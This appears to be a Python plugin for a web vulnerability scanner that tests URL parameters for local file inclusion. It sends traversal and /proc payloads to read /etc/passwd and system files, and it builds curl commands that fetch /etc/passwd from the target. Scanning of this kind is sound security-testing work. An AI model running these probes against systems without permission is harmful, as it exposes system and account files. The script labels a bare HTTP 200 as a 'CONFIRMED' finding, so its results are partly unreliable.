from urllib.parse import urlparse, parse_qs, urlencode

READABLE_SIGNS = [
    "root:x:",
    "daemon:x:",
    "bin:x:",
    "/bin/bash",
    "linux version",
    "processor",
    "cpu family",
    "vendor_id"
]

OPEN_BASEDIR_SIGNS = [
    "open_basedir restriction",
    "open_basedir"
]

# ❌ false positives (SQL / normal HTML)
FALSE_POSITIVE_SIGNS = [
    "you have an error in your sql",
    "sql syntax",
    "mysql",
    "<html",
    "<body",
    "<head",
    "acunetix"
]

LFI_TESTS = {
    "traversal": "../../../../etc/passwd",
    "proc_version": "/proc/version",
    "proc_cpu": "/proc/cpuinfo",
    "proc_cmd": "/proc/self/cmdline"
}

COMMON_DIRS = ["/hj/", "/tmp/", "/proc/"]

def run(url, ctx, base_resp):
    results = []
    if not base_resp:
        return results

    parsed = urlparse(url)
    qs = parse_qs(parsed.query)

    for param in qs:
        evidence = []
        readable_files = []
        allowed_paths = []

        # =========================
        # 1️⃣ open_basedir detection
        # =========================
        q = qs.copy()
        q[param] = LFI_TESTS["traversal"]

        test_url = parsed._replace(
            query=urlencode(q, doseq=True)
        ).geturl()

        r = ctx.get(test_url)
        if not r:
            continue

        body = r.text.lower()

        if any(sig in body for sig in OPEN_BASEDIR_SIGNS):
            evidence.append("open_basedir restriction detected")

        # =========================
        # 2️⃣ readable file checks (STRICT)
        # =========================
        for name, payload in LFI_TESTS.items():
            q[param] = payload
            test_url = parsed._replace(
                query=urlencode(q, doseq=True)
            ).geturl()

            r = ctx.get(test_url)
            if not r:
                continue

            body = r.text.lower()

            # ❌ SQL / HTML = NOT LFI
            if any(fp in body for fp in FALSE_POSITIVE_SIGNS):
                continue

            # ✅ real file markers
            if any(sig in body for sig in READABLE_SIGNS):
                readable_files.append(payload)

        # =========================
        # 3️⃣ allowed directory probing
        # =========================
        for path in COMMON_DIRS:
            q[param] = path + "test"
            test_url = parsed._replace(
                query=urlencode(q, doseq=True)
            ).geturl()

            r = ctx.get(test_url)
            if not r:
                continue

            body = r.text.lower()

            # again avoid SQL / HTML false positives
            if any(fp in body for fp in FALSE_POSITIVE_SIGNS):
                continue

            if r.status_code == 200:
                allowed_paths.append(path)

        # =========================
        # 4️⃣ FINAL RESULT (UNCHANGED FORMAT)
        # =========================
        if readable_files or allowed_paths:
            results.append({
                "type": "Local File Inclusion (LFI)",
                "confidence": "CONFIRMED",
                "severity": "Medium",
                "url": url,
                "param": param,
                "payload": LFI_TESTS["traversal"],
                "reason": "User input reaches file handling logic",
                "evidence": evidence,
                "allowed_paths": allowed_paths,
                "readable_files": readable_files,
                "verify": {
                    "blocked": f'curl "{parsed._replace(query=urlencode({param: "/etc/passwd"})).geturl()}"',
                    "allowed": [
                        f'curl "{parsed._replace(query=urlencode({param: p + "test"})).geturl()}"'
                        for p in allowed_paths
                    ],
                    "readable": [
                        f'curl "{parsed._replace(query=urlencode({param: f})).geturl()}"'
                        for f in readable_files
                    ]
                },
                "impact": [
                    "Local file disclosure",
                    "System information leakage"
                ]
            })

    return results

